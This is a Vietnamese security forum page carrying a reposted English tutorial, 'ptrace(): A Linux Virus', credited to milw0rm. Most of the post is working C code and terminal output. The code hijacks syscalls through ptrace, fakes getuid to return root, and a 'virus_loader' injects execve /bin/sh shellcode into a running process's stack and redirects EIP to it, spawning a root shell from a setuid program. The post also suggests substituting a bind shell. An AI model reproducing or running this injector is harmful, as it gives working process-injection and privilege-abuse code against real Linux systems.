<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="ptrace(): A Linux Virus, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>ptrace(): A Linux Virus - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="http://www.hvaonline.net" title="[Logo]">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.html">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.html">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.html">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.html">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.html">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.html"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.html">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.html">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.html">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<!-- navigator -->
<table cellspacing="2" cellpadding="2" width="100%" border="0" align="center">
	<tr>
		<td valign="baseline" align="left" colspan="0">
			<span class="nav">
			<a class="nav" href="/hvaonline/forums/list.html">Forum Index </a> 
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"> <a class="nav" href="/hvaonline/forums/show/28.html">Thảo luận virus, trojan, spyware, worm... </a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"> <a class="nav" href="/hvaonline/posts/list/18099.html" name="top" id="top">ptrace(): A Linux Virus</a>
				&nbsp;<a href="/hvaonline/rss/topicPosts/18099.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML"></a>
			</span>
		
		</td>

		<td valign="middle" align="right" class="nav"></td>
	</tr>
</table>

<!-- poll show -->

  <!-- POST LISTING -->


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#777777">[Question]</font></span>&nbsp;&nbsp; ptrace(): A Linux Virus<a name="108547" id="108547"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">06/01/2008 02:25:23 (+0700) | <a href="/hvaonline/posts/list/18099.html#108547">#1</a> | 108547 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>
<td width="20">
		<img src="http://www.hvaonline.net/hvaonline/images/avatar/5669805a145112776e74da1baf91e13e.jpg" border="0" alt="[Avatar]" title="[Avatar]"><br>
	</td>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/155119.html"><b>onlinehack</b></a><br>
	<font color="#CCCCCC">Member</font></span>
<br>

<span class="uprofile">
		
</span>
	<table cellspacing="0" cellpadding="0" border="0" width="20" height="8">
		<tr>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/minus.gif" alt="[Minus]" title="[Minus]"></a>	</td>
			<td height="4" width="16">
				<span class="warn">&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;</span>	</td>
			<td>
				<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/plus.gif" alt="[Plus]" title="[Plus]"></a>
			</td>
		</tr>
	</table>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 04/12/2007 23:07:12<br>
		Messages: 116<br>
	
		Location: Ma maison<br>
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/155119.html" class="icon_profile"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/155119.html" class="icon_pm"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
		
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row1">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row1"><span class="postbody"><font color='orange'><br/> ptrace() is a system call that enables one process to *control* the execution of another one.<br/> The traced process (the child) behaves normally until it caughts a signal and when this occur the process enter in STOPPED state and informs the tracing process by a wait() system call. After this the tracing process (the parent) decides what the traced process should do (responds). Take in mind that if the traced process caughts a SIGKILL it will be killed!<br/> </font><br/> <br/> #include &lt;sys/ptrace.h&gt;<br/> long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);<br/> <br/> The field 'request' is a value that determines the action that has to be performed.<br/> Here below you will find some actions that you can specify in the ptrace() function:<br/> <br/> <font color='orange'>- PTRACE_GETREGS</font><br/> This copies the child's General Purpose or Floating-Point registers to location data in the parent.<br/> <br/> <font color='orange'>- PTRACE_SETREGS</font><br/> This 'request' copies the child's GPR or Floating-Point registers from a location in the parent. (also take a look at this request: PTRACE_POKEUSR).<br/> <br/> <font color='orange'>- PTRACE_CONT<br/> Restarts the stopped child process.<br/> <br/> [color=orange]- PTRACE_KILL</font><br/> Sends to the child process a SIGKILL (to terminate it)<br/> <br/> <font color='orange'>- PTRACE_ATTACH</font><br/> Attaches to the process identified by the field pid and make the process traced as a child of the tracing process (current process).<br/> As I said before the tracing process became the parent of the traced process (child) and it will receive notifications from the child events but if a getppid is called will return the PID of the original parent.<br/> <br/> <font color='orange'>- PTRACE_DETACH</font><br/> It restarts the stopped child and detaches the tracing process (child) from the traced process (*parent*). If ptrace has interrupted a syscall that has been called (but not executed) the kernel subtract 2 bytes (from EIP) after PTRACE_DETACH.<br/> <br/> If you wanna more informations about ptrace() please read the man pages. (could be useful).<br/> <br/> <br/> <br/> <br/> <font color='yellow'>[ 0x02: Have fun with ptrace() ]</font><br/> <br/> Now it's time to *Having fun with ptrace()* function!!<br/> In this section I'll try to explain how to (p)trace a process and intercepts<br/> syscall (and modify its arguments). The best way to explain what we have to do <br/> is to show to you a source code:<br/> <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>/* target1.c */

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main&#40;&#41; {

	char str&#91;&#93;="Hi\nSup Guys?\n";
	write&#40;0, str, strlen&#40;str&#41;&#41;; 
	return 0;

}

/* end target1.c */

&#40;.&#41;Output:

$./target1
Hi
Sup Guys?
$

And here below you will find the tracer1.c code:

/* tracer1.c */

#include &lt;sys/ptrace.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;
#include &lt;linux/user.h&gt;
#include &lt;sys/syscall.h&gt;


int main&#40;int argc, char *argv&#91;&#93;&#41; {

if &#40;argc &lt; 2&#41; {
	printf&#40;"please specify the absolute path of the target1\n"&#41;;
	printf&#40;"%s &lt; /path/target1 &gt;\n", argv&#91;0&#93;&#41;;
	exit&#40;1&#41;;
	}

int orig_syscall = 0;
int status;
struct user_regs_struct regs;
pid_t pid;

pid = fork&#40;&#41;;

if &#40;pid == 0&#41; { //child

ptrace&#40;PTRACE_TRACEME, 0, 0, 0&#41;;
execl&#40;argv&#91;1&#93;, argv&#91;1&#93;, NULL&#41;;
} else { //parent

wait &#40;&status&#41;; //wait the child

	while&#40;1&#41; {

	ptrace&#40;PTRACE_SYSCALL, pid, 0, 0&#41;;	 //restart the stopped child and send a SIGTRAP when
						//a syscall is called to inspect the arguments
	wait&#40;&status&#41;; //wait again the child

	ptrace&#40;PTRACE_GETREGS, pid, 0, &regs&#41;;
	orig_syscall = regs.orig_eax; // here I have the original eax &#40;the syscall number&#41;

		if &#40;orig_syscall == SYS_write&#41; { //Is our syscall number the SYS_write ??
		regs.edx = 3;	//set edx to 3 &#40;MAX msg length -&gt; more info here: man write&#40;1&#41; &#41;
		ptrace&#40;PTRACE_SETREGS, pid, 0, &regs&#41;; //the the GP register&#40;s&#41;
		}

		}
	}

	ptrace&#40; PTRACE_DETACH, pid, NULL, NULL &#41;;
	return 0;

}

/* end of tracer1.c */

&#40;.&#41;Output:

#./tracer1 /home/omni/target1
Hi

#

Ehy what's that? As you can see the output of tracer1 is *Hi\n* ! 
But why? Look at the tracer1.c source code; there is an "important" assignment:

&#91;...&#93;
regs.edx = 3;
&#91;...&#93;

We set the register edx to 3 &#40;maximum length of "string" in our write&#40;&#41; syscall&#41;.

Look in depth what the tracer1 do:

1. check if the syscall write&#40;&#41; is called
2. read the CPU registers
3. set the register edx to 3
4. detach from the process traced

Eg:

write&#40;0, 		-&gt; stdout
"Hi\nSup Guys?\n, 	-&gt; it will print only Hi\n &#40;edx = 3&#41;
3&#41;; 			-&gt; modified by edx &#40;edx = 3&#41;


Do you get it? Simple right? ;&#41;


Cool, now I just wanna try to explain an other interesting example; so look
at the source code of target2.c and tracer2.c !!!

/* target2.c */

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main&#40;&#41; {
	printf&#40; "user id: %d\n", getuid&#40;&#41; &#41;;
	execl&#40;"/bin/csh", "csh", NULL, 0&#41;;
	return 0;
}

/* end of target2.c */

&#40;.&#41; Output:
$ ./target2
user id: 1000
%id
uid=1000&#40;omni&#41; gid=100&#40;users&#41; groups=11&#40;floppy&#41;,17&#40;audio&#41;,18&#40;video&#41;,19&#40;cdrom&#41;,100&#40;user&#41;


And now.. tracer2.c :

/* tracer2.c */

#include &lt;sys/ptrace.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;
#include &lt;linux/user.h&gt;
#include &lt;sys/syscall.h&gt;


int main&#40;int argc, char *argv&#91;&#93;&#41; {

if &#40;argc &lt; 2&#41; {
	printf&#40;"please specify the absolute path of the target1\n"&#41;;
	printf&#40;"%s &lt; /home/omni/articles/target1 &gt;\n", argv&#91;0&#93;&#41;;
	exit&#40;1&#41;;
	}

int orig_syscall = 0;
int status;
struct user_regs_struct regs;
pid_t pid;

pid = fork&#40;&#41;;

if &#40;pid == 0&#41; { //child

ptrace&#40;PTRACE_TRACEME, 0, 0, 0&#41;;
execl&#40;argv&#91;1&#93;, argv&#91;1&#93;, NULL&#41;;
} else { //parent

	wait &#40;&status&#41;; //wait the child

	while&#40;1&#41; {

	ptrace&#40;PTRACE_SYSCALL, pid, 0, 0&#41;;	 //restart the stopped child and send a SIGTRAP when
						//a syscall is called to inspect the arguments
	wait&#40;&status&#41;; //wait again the child

	ptrace&#40;PTRACE_GETREGS, pid, 0, &regs&#41;;
	orig_syscall = regs.orig_eax; // here I have the original eax &#40;the syscall number&#41;

		if &#40;orig_syscall == SYS_getuid32&#41; {
		regs.ebx = 0;	//set ebx to 0 &#40;root access&#41;
		ptrace&#40;PTRACE_SETREGS, pid, 0, &regs&#41;; //the the GP register&#40;s&#41;
		}

		}
	}

	ptrace&#40; PTRACE_DETACH, pid, NULL, NULL &#41;;
	return 0;

}

/* end of tracer2.c */


&#40;.&#41; Output:
# ./tracer2 /home/omni/articles/target2
user id: 0
%id;
uid=0&#40;root&#41; gid=0&#40;root&#41; groups=0&#40;root&#41;,1&#40;bin&#41;,2&#40;daemon&#41;,3&#40;sys&#41;,4&#40;adm&#41;,6&#40;disk&#41;,10&#40;wheel&#41;,11&#40;floppy&#41;


Killed!

#

If you read the source code you will find my comments and I thik &#40;/hope&#41; you
will understand; but for lazy people I'll explain the main functions.

&#91;... in the child ...&#93;

ptrace&#40;PTRACE_TRACEME, 0, 0, 0&#41;;
execl&#40;argv&#91;1&#93;, argv&#91;1&#93;, NULL&#41;;

&#91;....&#93;

Just trace the process..

&#91;... in the parent ...&#93;

1. ptrace&#40;PTRACE_SYSCALL, pid, 0, 0&#41;;
2. ptrace&#40;PTRACE_GETREGS, pid, 0, &regs&#41;;
orig_syscall = regs.orig_eax;

3. if &#40;orig_syscall == SYS_getuid32&#41; {
4. regs.ebx = 0;	
5. ptrace&#40;PTRACE_SETREGS, pid, 0, &regs&#41;;
}

&#91;....&#93;</pre>
		</div><br/> <br/> Here is a little bit more difficult but if you understand C this will not be a problem <img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom"><br/> <br/> 1.   Just *restart* the stopped child and read the syscall arguments<br/> 2.   Read the the CPU registers<br/> 3/4. If the syscall is SYS_getuid32 set ebx to 0 and "gain" root access<br/> 5.   Copy the child registers<br/> <br/> And now the /bin/csh shell is *spawned* with root privilege!!<br/> <br/> -----------------------------------------------------------------------------[/]<br/> <br/> <font color='yellow'>---[ 0x03: Injecting codes.. ]</font><br/> <br/> Injecting codes in a (p)traced ELF is not so difficult; but if you wanna understand easily how to do it you have to read carefully the code.<br/> <br/> Here below we have simple.c (the traced process):<br/> <br/> <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>/* simple.c */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main&#40;&#41; {

	char buf&#91;1024&#93;;

	scanf&#40;"%s", buf&#41;;

	printf&#40;"-&gt; %s\n", buf&#41;;

}

/* end of simple.c */

$ gcc simple.c -o simple
# chmod u+s simple

&#40;.&#41; Output:
$ ./simple
Hi
-&gt; Hi
$</pre>
		</div><br/> <br/> <font color='orange'>Now it's time of our virus code: </font><br/> <br/> <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>/* virus_loader.c */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;linux/user.h&gt;
#include &lt;linux/ptrace.h&gt;

// shellcode "grepped" from internet &#40;make your own shellcode,
// eg a bind shell&#41;
char virus_payload&#91;&#93; =
	"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"
	"\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"
	"\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"
	"\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"
	"\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42";


//inject func prototype
int inject&#40;pid_t pid, long memaddr, void *buf, int buflen&#41;;

int main&#40;int argc, char *argv&#91;&#93;&#41; {

	pid_t pid;			//pid of the ELF that we have to infect
	struct user_regs_struct regs;	//CPU registers
	long address;			//where we will put our virus payload

		if &#40;argc &lt; 2&#41; {
		printf&#40;"usage: %s &lt;ELF-pid&gt;\n", argv&#91;0&#93;&#41;;
		return -1;
		}

	pid = atoi&#40;argv&#91;1&#93;&#41;;
	
		//ATTACH to the pid 
		if &#40;ptrace&#40;PTRACE_ATTACH, pid, NULL, NULL&#41; &lt; 0&#41; {
		perror&#40;"ATTACH"&#41;;
		return -1;
		}

	// Wait the child.. &#40;the *attached* ELF is the child&#41;

	int status = 0;

	wait&#40;&status&#41;;

		printf&#40;"&#91;+&#93; %d ATTACHED\n", pid&#41;;

		//get the CPU registers and put it in our
		//struct regs
		//We will use it soon..
		if &#40;ptrace&#40;PTRACE_GETREGS, pid, &regs, &regs&#41; &lt; 0&#41; {
		perror&#40;"GETREGS"&#41;;
		ptrace&#40;PTRACE_DETACH, pid, NULL, NULL&#41;;
		return -1;
		}

	//calculate the address were we have to PUT our 
	//virus payload &#40;we will put it into ESP - 1024&#41;

	printf&#40;"&#91;+&#93; Calculating the address of our payload\n"&#41;;
	address = regs.esp - 1024;


	printf&#40;"&#91;+&#93; Virus Payload at address: 0x%.8x\n", address&#41;;

		//inject function is called.. &#40;see below&#41;
		if &#40;inject&#40;pid, address, virus_payload, sizeof&#40;virus_payload&#41; - 1&#41; &lt; 0&#41; {
		return -1;
		}

	//EIP now *points* to our virus payload
	regs.eip = address + 2;

		printf&#40;"&#91;+&#93; EIP points to virus payload at address: 0x%.8x\n", regs.eip&#41;;
		//It's time to set EIP and let its to point
		//to our virus payload 
		if &#40;ptrace&#40;PTRACE_SETREGS, pid, &regs, &regs&#41; &lt; 0&#41; {
		perror&#40;"SETREGS"&#41;;
		ptrace&#40;PTRACE_DETACH, pid, NULL, NULL&#41;;
		return -1;
		}

	ptrace&#40;PTRACE_DETACH, pid, NULL, NULL&#41;;

    printf&#40;"&#91;+&#93; Shell Spawned !!\n"&#41;;

    return 0;
}

// Injection Function

int inject&#40;pid_t pid, long addr, void *virus, int len&#41; {

	long payload;
	int i = 0;

	//copy virus payload into *address* memory &#40;esp - 1024&#41;
	while &#40;i &lt; len&#41; {
	
	memcpy&#40;&payload, virus, 4&#41;;

	//insert the payload into the memory
	if &#40;ptrace&#40;PTRACE_POKETEXT, pid, addr, payload&#41; &lt; 0 &#41; {
		perror&#40;"Inject&#40;&#41;"&#41;;
		ptrace&#40;PTRACE_DETACH, pid, NULL, NULL&#41;;
		return -1;
	}

	addr += 4;
	virus += 4;
	i += 4;

	}

	return 0;
}

/* end of virus_loader.c */

Let's try it..

--- &#91; Shell 1 &#93; ---

$ ls -al simple
-rwsr-xr-x 1 root root 8148 2007-12-14 19:26 simple*

&#91;suid bit ACTIVATED&#93;

$ ./simple
sh-3.1# id
uid=0&#40;root&#41; gid=100&#40;users&#41; groups=11&#40;floppy&#41;,17&#40;audio&#41;,18&#40;video&#41;,19&#40;cdrom&#41;,100&#40;users&#41;
sh-3.1#

--- &#91; Shell 2 &#93; ---

# ps -A | grep simple
 4779 pts/3    00:00:00 simple
# ./virus_loader 4779
&#91;+&#93; 4779 ATTACHED
&#91;+&#93; Calculating the address of our payload
&#91;+&#93; Virus Payload at address: 0xbfb2fe08
&#91;+&#93; EIP points to virus payload at address: 0xbfb2fe0a
&#91;+&#93; Shell Spawned !!
#

Here is a simple example; you can also add your own shellcode &#40;eg a bind shell&#41;
and than give again the control back to the ELF.

-----------------------------------------------------------------------------&#91;/&#93;</pre>
		</div><br/> <font color='yellow'><br/> ---[ 0x04: General Infos ]</font><br/> <br/> - Why is it useful to use ptrace? My opinion is simple; if you are root you can<br/> (WITHOUT LKM) modify syscalls, inject your own codes in a running process and <br/> much more.. ( eg control a process in runtime!! )<br/> <br/> ptrace() is also used by debuggers for tracing syscall, set breakpoints, etc;<br/> and this is a great things because you can do it in User Land.<br/> <br/> - Is it possible to trace the same process twice?<br/> No, it's not possible; because if you look here:<br/> <br/> /usr/src/linux-***/arch/i386/kernel/ptrace.c<br/> <br/> you will find:<br/> <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>if &#40;!&#40;current-&gt;ptrace & PT_PTRACED&#41;&#41;
		goto out; &lt;- GOTO OUT!!!</pre>
		</div><br/> -----------------------------------------------------------------------------[/]<br/> <br/> <font color='yellow'>---[ 0x05: Reference ]</font><br/> <br/> [1] Man of ptrace()<br/> [2] Building ptrace injecting shellcodes<br/>     (Volume 0x0b, Issue 0x3b, Phile #0x0c of 0x12)<br/> <br/> <font color='red'>Nguồn : milw0rm</font> </span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>


			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td valign="middle" align="right" class="nav"></td>
	</tr>
</table>

<!-- quick reply -->
<table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0" align="center">
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td align="left">
			<!-- watch - unwatch -->
			<!-- add bookmark -->

		</td>
		<td align="right" valign="bottom">			
		</td>
	</tr>
</table>

<!-- mod -->

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<!-- combo navigator -->
<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td align="left"><a href="http://digg.com/submit?phrase=2&url=http://www.hvaonline.net/hvaonline/posts/list/18099.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/digg.gif" align="texttop" alt="[digg]" title="[digg]"></a>
<a href="http://del.icio.us/post?url=http://www.hvaonline.net/hvaonline/posts/list/18099.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/delicious.gif" align="texttop" alt="[delicious]" title="[delicious]"></a>
<a href="http://www.google.com/bookmarks/mark?op=edit&output=popup&bkmk=http://www.hvaonline.net/hvaonline/posts/list/18099.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/google.gif" align="texttop" alt="[google]" title="[google]"></a>
<a href="http://bookmarks.yahoo.com/toolbar/savebm?opener=tb&u=http://www.hvaonline.net/hvaonline/posts/list/18099.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/yahoo.gif" align="texttop" alt="[yahoo]" title="[yahoo]"></a>
<a href="http://technorati.com/faves?add=http://www.hvaonline.net/hvaonline/posts/list/18099.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/technorati.gif" align="texttop" alt="[technorati]" title="[technorati]"></a>
<a href="http://reddit.com/submit?url=http://www.hvaonline.net/hvaonline/posts/list/18099.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/reddit.gif" align="texttop" alt="[reddit]" title="[reddit]"></a>
<a href="http://www.stumbleupon.com/submit?url=http://www.hvaonline.net/hvaonline/posts/list/18099.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/stumbleupon.gif" align="texttop" alt="[stumbleupon]" title="[stumbleupon]"></a></td>
		<td align="right">	<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap">
				<form action="" name="f" id="f" accept-charset="UTF-8">
					<span class="gensmall">Go to:&nbsp;</span>
					<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/forums/show/'+ this.options[this.selectedIndex].value +'.html'; }" name="select">
						<option value="0" selected="selected">Select a forum</option>				
							<option value="0">-------------</option>
									<option value="2" >Thông báo từ HVA</option>
									<option value="41" >FAQ - Các câu hỏi thường gặp</option>
									<option value="5" >Góp ý và Hỏi đáp thắc mắc chung</option>
									<option value="6" >Kiểm tra bảo mật</option>
							<option value="0">-------------</option>
									<option value="8" >Thảo luận bảo mật</option>
									<option value="12" >Thảo luận thâm nhập</option>
									<option value="28" selected="selected">Thảo luận virus, trojan, spyware, worm...</option>
									<option value="36" >Thủ thuật reverse engineering</option>
									<option value="13" >Thông tin new bugs và exploits</option>
									<option value="51" >Case Studies</option>
							<option value="0">-------------</option>
									<option value="23" >Thảo luận hệ điều hành Windows</option>
									<option value="24" >Thảo luận hệ điều hành *nix</option>
									<option value="26" >Thảo luận các loại thiết bị máy tính</option>
									<option value="31" >Thảo luận mạng và thiết bị mạng</option>
									<option value="27" >Thông tin về các địa chỉ và tài liệu hữu ích</option>
							<option value="0">-------------</option>
									<option value="44" >Người tìm việc - Việc tìm người</option>
									<option value="21" >Thảo luận việc định hướng</option>
									<option value="19" >Những thảo luận khác</option>
									<option value="50" >Hình minh họa</option>
									<option value="33" >Trash</option>
							<option value="0">-------------</option>
					</select>
				</form>
			</td>
		</tr>
	</table>
</td>
	</tr>
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<!-- list users in -->
<table class="forumline" cellspacing="3" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<th class="thright"  nowrap="nowrap" height="26" valign="middle">&nbsp;Users currently in here&nbsp;</th>
	</tr>
		<tr>
			<td class="gensmall" valign="middle" align="left">
				1 Anonymous 
				
			</td>	
		</tr>
</table>
<a name="quick"></a>

<table cellspacing="0" cellpadding="0" width="100%" border="0"  align="center">

	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
